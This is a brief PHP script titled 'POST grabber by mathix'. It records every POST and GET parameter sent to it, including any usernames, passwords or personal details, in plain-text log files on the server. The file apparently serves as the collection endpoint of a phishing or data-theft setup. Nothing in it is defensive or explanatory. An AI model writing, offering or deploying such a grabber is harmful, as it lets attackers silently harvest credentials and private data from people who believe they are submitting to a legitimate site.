<?php
    // POST grabber by mathix
    $data = "==================================================";
    if (!empty($_POST)) {
        $data .= PHP_EOL . print_r($_POST, TRUE) . PHP_EOL . "==================================================";
        file_put_contents("log_post.txt", $data . PHP_EOL, FILE_APPEND);
    }
    if (!empty($_GET)) {
        $data .= PHP_EOL . print_r($_GET, TRUE) . PHP_EOL . "==================================================";
        file_put_contents("log_get.txt", $data . PHP_EOL, FILE_APPEND);
    }
?>